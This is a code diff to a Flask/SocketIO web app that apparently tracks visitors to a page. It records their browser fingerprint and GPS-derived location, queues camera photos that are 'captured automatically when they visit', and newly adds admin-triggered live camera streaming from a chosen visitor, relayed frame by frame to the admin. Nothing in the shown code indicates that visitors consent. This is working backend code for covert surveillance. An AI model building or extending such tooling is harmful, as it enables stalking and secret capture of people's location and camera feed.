@@ -266,11 +266,6 @@ def index():
     """Serve the main page with the button"""
     return render_template('index.html')
 
-@app.route('/test')
-def test_page():
-    """Test page to diagnose Railway connection issues"""
-    return render_template('test.html')
-
 @app.route('/health')
 def health():
     """Health check endpoint for Railway"""
@@ -483,29 +478,48 @@ def collect_data():
         fingerprint = data.get('fingerprint', {}).get('fp', '')
 
         # Helper function to reverse geocode coordinates to English location names
-        def reverse_geocode_coordinates(lat, lon):
-            """Reverse geocode coordinates to get English location names"""
-            try:
-                # Use OpenStreetMap Nominatim with English language preference
-                reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
-                reverse_response = requests.get(
-                    reverse_geocode_url, 
-                    timeout=5, 
-                    headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
-                )
-                if reverse_response.ok:
-                    reverse_data = reverse_response.json()
-                    address = reverse_data.get('address', {})
-                    city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
-                    country = address.get('country')
-                    region = address.get('state') or address.get('region') or address.get('county')
-                    return {
-                        'city': city,
-                        'country': country,
-                        'region': region
-                    }
-            except Exception as e:
-                logger.warning(f"Reverse geocode failed for {lat},{lon}: {e}")
+        def reverse_geocode_coordinates(lat, lon, retries=3):
+            """Reverse geocode coordinates to get English location names with retry logic"""
+            import time
+            for attempt in range(retries):
+                try:
+                    # Use OpenStreetMap Nominatim with English language preference
+                    reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
+                    reverse_response = requests.get(
+                        reverse_geocode_url, 
+                        timeout=10,  # Increased timeout for Railway
+                        headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
+                    )
+                    if reverse_response.ok:
+                        reverse_data = reverse_response.json()
+                        address = reverse_data.get('address', {})
+                        city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
+                        country = address.get('country')
+                        region = address.get('state') or address.get('region') or address.get('county')
+                        result = {
+                            'city': city,
+                            'country': country,
+                            'region': region
+                        }
+                        if city or country:  # Only return if we got useful data
+                            logger.info(f"Reverse geocode successful for {lat},{lon}: {city}, {country}")
+                            return result
+                        else:
+                            logger.warning(f"Reverse geocode returned empty data for {lat},{lon}")
+                    else:
+                        logger.warning(f"Reverse geocode HTTP error {reverse_response.status_code} for {lat},{lon} (attempt {attempt + 1}/{retries})")
+                except requests.exceptions.Timeout:
+                    logger.warning(f"Reverse geocode timeout for {lat},{lon} (attempt {attempt + 1}/{retries})")
+                except requests.exceptions.RequestException as e:
+                    logger.warning(f"Reverse geocode request error for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
+                except Exception as e:
+                    logger.warning(f"Reverse geocode failed for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
+                
+                # Wait before retry (exponential backoff)
+                if attempt < retries - 1:
+                    time.sleep(1 * (attempt + 1))
+            
+            logger.error(f"Reverse geocode failed after {retries} attempts for {lat},{lon}")
             return None
 
         # Prioritize GPS coordinates over IP location
@@ -1160,28 +1174,47 @@ def update_locations_from_coordinates():
 
     try:
         # Helper function to reverse geocode coordinates to English location names
-        def reverse_geocode_coordinates(lat, lon):
-            """Reverse geocode coordinates to get English location names"""
-            try:
-                reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
-                reverse_response = requests.get(
-                    reverse_geocode_url, 
-                    timeout=5, 
-                    headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
-                )
-                if reverse_response.ok:
-                    reverse_data = reverse_response.json()
-                    address = reverse_data.get('address', {})
-                    city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
-                    country = address.get('country')
-                    region = address.get('state') or address.get('region') or address.get('county')
-                    return {
-                        'city': city,
-                        'country': country,
-                        'region': region
-                    }
-            except Exception as e:
-                logger.warning(f"Failed reverse geocode for {lat},{lon}: {e}")
+        def reverse_geocode_coordinates(lat, lon, retries=3):
+            """Reverse geocode coordinates to get English location names with retry logic"""
+            import time
+            for attempt in range(retries):
+                try:
+                    reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
+                    reverse_response = requests.get(
+                        reverse_geocode_url, 
+                        timeout=10,  # Increased timeout for Railway
+                        headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
+                    )
+                    if reverse_response.ok:
+                        reverse_data = reverse_response.json()
+                        address = reverse_data.get('address', {})
+                        city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
+                        country = address.get('country')
+                        region = address.get('state') or address.get('region') or address.get('county')
+                        result = {
+                            'city': city,
+                            'country': country,
+                            'region': region
+                        }
+                        if city or country:  # Only return if we got useful data
+                            logger.info(f"Reverse geocode successful for {lat},{lon}: {city}, {country}")
+                            return result
+                        else:
+                            logger.warning(f"Reverse geocode returned empty data for {lat},{lon}")
+                    else:
+                        logger.warning(f"Reverse geocode HTTP error {reverse_response.status_code} for {lat},{lon} (attempt {attempt + 1}/{retries})")
+                except requests.exceptions.Timeout:
+                    logger.warning(f"Reverse geocode timeout for {lat},{lon} (attempt {attempt + 1}/{retries})")
+                except requests.exceptions.RequestException as e:
+                    logger.warning(f"Reverse geocode request error for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
+                except Exception as e:
+                    logger.warning(f"Failed reverse geocode for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
+                
+                # Wait before retry (exponential backoff)
+                if attempt < retries - 1:
+                    time.sleep(1 * (attempt + 1))
+            
+            logger.error(f"Reverse geocode failed after {retries} attempts for {lat},{lon}")
             return None
 
         with closing(sqlite3.connect(DB_PATH)) as conn:
@@ -1250,34 +1283,53 @@ def update_location_from_coordinates():
             return jsonify({'error': 'Missing required fields: entry_id, latitude, longitude'}), 400
 
         # Helper function to reverse geocode coordinates to English location names
-        def reverse_geocode_coordinates(lat, lon):
-            """Reverse geocode coordinates to get English location names"""
-            try:
-                reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
-                reverse_response = requests.get(
-                    reverse_geocode_url, 
-                    timeout=5, 
-                    headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
-                )
-                if reverse_response.ok:
-                    reverse_data = reverse_response.json()
-                    address = reverse_data.get('address', {})
-                    city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
-                    country = address.get('country')
-                    region = address.get('state') or address.get('region') or address.get('county')
-                    return {
-                        'city': city,
-                        'country': country,
-                        'region': region
-                    }
-            except Exception as e:
-                logger.warning(f"Failed reverse geocode for {lat},{lon}: {e}")
+        def reverse_geocode_coordinates(lat, lon, retries=3):
+            """Reverse geocode coordinates to get English location names with retry logic"""
+            import time
+            for attempt in range(retries):
+                try:
+                    reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
+                    reverse_response = requests.get(
+                        reverse_geocode_url, 
+                        timeout=10,  # Increased timeout for Railway
+                        headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
+                    )
+                    if reverse_response.ok:
+                        reverse_data = reverse_response.json()
+                        address = reverse_data.get('address', {})
+                        city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
+                        country = address.get('country')
+                        region = address.get('state') or address.get('region') or address.get('county')
+                        result = {
+                            'city': city,
+                            'country': country,
+                            'region': region
+                        }
+                        if city or country:  # Only return if we got useful data
+                            logger.info(f"Reverse geocode successful for {lat},{lon}: {city}, {country}")
+                            return result
+                        else:
+                            logger.warning(f"Reverse geocode returned empty data for {lat},{lon}")
+                    else:
+                        logger.warning(f"Reverse geocode HTTP error {reverse_response.status_code} for {lat},{lon} (attempt {attempt + 1}/{retries})")
+                except requests.exceptions.Timeout:
+                    logger.warning(f"Reverse geocode timeout for {lat},{lon} (attempt {attempt + 1}/{retries})")
+                except requests.exceptions.RequestException as e:
+                    logger.warning(f"Reverse geocode request error for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
+                except Exception as e:
+                    logger.warning(f"Failed reverse geocode for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
+                
+                # Wait before retry (exponential backoff)
+                if attempt < retries - 1:
+                    time.sleep(1 * (attempt + 1))
+            
+            logger.error(f"Reverse geocode failed after {retries} attempts for {lat},{lon}")
             return None
 
-        # Reverse geocode the coordinates
+        # Reverse geocode the coordinates (non-blocking - continue even if it fails)
         reverse_geocoded = reverse_geocode_coordinates(latitude, longitude)
         if not reverse_geocoded:
-            return jsonify({'error': 'Failed to reverse geocode coordinates'}), 500
+            logger.warning(f"Reverse geocoding failed for {latitude},{longitude}, but continuing with coordinates only")
 
         # Get existing entry data
         try:
@@ -1295,13 +1347,13 @@ def update_location_from_coordinates():
                 except:
                     location_data = {}
 
-                # Update location data with new coordinates and reverse geocoded location
+                # Update location data with new coordinates and reverse geocoded location (if available)
                 location_data.update({
                     'latitude': float(latitude),
                     'longitude': float(longitude),
-                    'city': reverse_geocoded.get('city') or location_data.get('city'),
-                    'country': reverse_geocoded.get('country') or location_data.get('country'),
-                    'region': reverse_geocoded.get('region') or location_data.get('region'),
+                    'city': reverse_geocoded.get('city') if reverse_geocoded else location_data.get('city'),
+                    'country': reverse_geocoded.get('country') if reverse_geocoded else location_data.get('country'),
+                    'region': reverse_geocoded.get('region') if reverse_geocoded else location_data.get('region'),
                     'location_type': 'gps',  # Mark as GPS since it's manually updated from map
                     'updated_from_map': True,
                     'updated_at': datetime.now().isoformat()
@@ -1315,15 +1367,16 @@ def update_location_from_coordinates():
             logger.error(f"Database error updating location: {e}", exc_info=True)
             return jsonify({'error': 'Database error'}), 500
 
-        logger.info(f"Updated entry #{entry_id} with location: {reverse_geocoded.get('city')}, {reverse_geocoded.get('country')} at {latitude},{longitude}")
+        city_country = f"{reverse_geocoded.get('city')}, {reverse_geocoded.get('country')}" if reverse_geocoded and reverse_geocoded.get('city') else (reverse_geocoded.get('country') if reverse_geocoded else 'coordinates only')
+        logger.info(f"Updated entry #{entry_id} with location: {city_country} at {latitude},{longitude}")
 
         return jsonify({
             'status': 'success',
-            'message': 'Location updated successfully',
+            'message': 'Location updated successfully' + (' (coordinates only - reverse geocoding failed)' if not reverse_geocoded else ''),
             'location': {
-                'city': reverse_geocoded.get('city'),
-                'country': reverse_geocoded.get('country'),
-                'region': reverse_geocoded.get('region'),
+                'city': reverse_geocoded.get('city') if reverse_geocoded else None,
+                'country': reverse_geocoded.get('country') if reverse_geocoded else None,
+                'region': reverse_geocoded.get('region') if reverse_geocoded else None,
                 'latitude': latitude,
                 'longitude': longitude
             }
@@ -1544,6 +1597,10 @@ def serve_photo(filename):
 active_users = {}
 # Store pending photo requests: {entry_id: [request_data, ...]}
 pending_photo_requests = {}
+# Store active stream sessions: {entry_id: {'admin_socket_id': socket_id, 'user_socket_id': socket_id}}
+active_streams = {}
+# Maximum concurrent streams to prevent server overload
+MAX_CONCURRENT_STREAMS = 5
 
 @socketio.on('connect')
 def handle_connect():
@@ -1573,11 +1630,24 @@ def handle_disconnect():
             del active_users[entry_id]
             logger.debug(f"Removed user entry {entry_id}")
             
+            # Clean up active streams if user disconnects
+            if entry_id in active_streams:
+                del active_streams[entry_id]
+                logger.debug(f"Cleaned up stream for entry {entry_id}")
+            
             # Broadcast user status update to admin dashboard
             emit('user_status_update', {
                 'entry_id': entry_id,
                 'is_online': False
             }, broadcast=True, include_self=False)
+    
+    # Clean up streams where admin disconnected
+    for entry_id, stream_info in list(active_streams.items()):
+        if stream_info.get('admin_socket_id') == request.sid:
+            # Notify user to stop streaming
+            emit('stop_stream_request', {'entry_id': entry_id}, room=f'user_{entry_id}')
+            del active_streams[entry_id]
+            logger.debug(f"Cleaned up stream for entry {entry_id} (admin disconnected)")
 
 @socketio.on('register_user')
 def handle_register_user(data):
@@ -1699,6 +1769,107 @@ def handle_request_photo(data):
                 'error': error_msg,
                 'suggestion': 'The user may not be currently on the website. Photo will be captured automatically when they visit.'
             })
+
+@socketio.on('request_stream')
+def handle_request_stream(data):
+    """Admin requests a live stream from a specific user"""
+    entry_id = data.get('entry_id')
+    fingerprint = data.get('fingerprint', '')
+    
+    if not entry_id and not fingerprint:
+        emit('stream_request_error', {'error': 'Entry ID or fingerprint required'})
+        return
+    
+    # Check concurrent stream limit to prevent server overload
+    if len(active_streams) >= MAX_CONCURRENT_STREAMS:
+        emit('stream_request_error', {
+            'error': 'Maximum concurrent streams reached',
+            'suggestion': f'Only {MAX_CONCURRENT_STREAMS} streams can run simultaneously. Please wait for another stream to finish.'
+        })
+        logger.warning(f"Stream request rejected: maximum concurrent streams ({MAX_CONCURRENT_STREAMS}) reached")
+        return
+    
+    # Find user by entry_id or fingerprint
+    target_socket_id = None
+    target_entry_id = None
+    
+    if entry_id and entry_id in active_users:
+        target_socket_id = active_users[entry_id]['socket_id']
+        target_entry_id = entry_id
+    elif fingerprint:
+        # Search by fingerprint
+        for eid, user_info in active_users.items():
+            if user_info.get('fingerprint') == fingerprint:
+                target_socket_id = user_info['socket_id']
+                target_entry_id = eid
+                break
+    
+    if target_socket_id and target_entry_id:
+        # User is online - send stream request
+        request_data = {
+            'entry_id': target_entry_id,
+            'fingerprint': fingerprint,
+            'requested_at': datetime.now().isoformat()
+        }
+        emit('stream_request', request_data, room=f'user_{target_entry_id}')
+        
+        # Store stream session
+        active_streams[target_entry_id] = {
+            'admin_socket_id': request.sid,
+            'user_socket_id': target_socket_id,
+            'started_at': datetime.now().isoformat()
+        }
+        
+        logger.debug(f"Stream request sent to entry {target_entry_id}")
+        emit('stream_requested', {
+            'entry_id': target_entry_id,
+            'status': 'started',
+            'message': 'Stream request sent to user'
+        })
+    else:
+        # User not online
+        error_msg = f"User not online (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
+        logger.warning(error_msg)
+        emit('stream_request_error', {
+            'error': error_msg,
+            'suggestion': 'The user must be online to start a live stream.'
+        })
+
+@socketio.on('stop_stream')
+def handle_stop_stream(data):
+    """Admin stops a live stream"""
+    entry_id = data.get('entry_id')
+    
+    if entry_id and entry_id in active_streams:
+        # Notify user to stop streaming
+        emit('stop_stream_request', {'entry_id': entry_id}, room=f'user_{entry_id}')
+        
+        # Remove stream session
+        del active_streams[entry_id]
+        
+        emit('stream_stopped', {
+            'entry_id': entry_id,
+            'status': 'stopped',
+            'message': 'Stream stopped'
+        })
+        logger.debug(f"Stream stopped for entry {entry_id}")
+    else:
+        emit('stream_request_error', {'error': 'No active stream found'})
+
+@socketio.on('stream_frame')
+def handle_stream_frame(data):
+    """Receive video frame from user and forward to admin"""
+    entry_id = data.get('entry_id')
+    frame_data = data.get('frame_data')  # Base64 encoded frame
+    
+    if entry_id and entry_id in active_streams:
+        # Forward frame to admin
+        admin_socket_id = active_streams[entry_id]['admin_socket_id']
+        emit('stream_frame', {
+            'entry_id': entry_id,
+            'frame_data': frame_data,
+            'timestamp': datetime.now().isoformat()
+        }, to=admin_socket_id)
 
 if __name__ == '__main__':
     socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
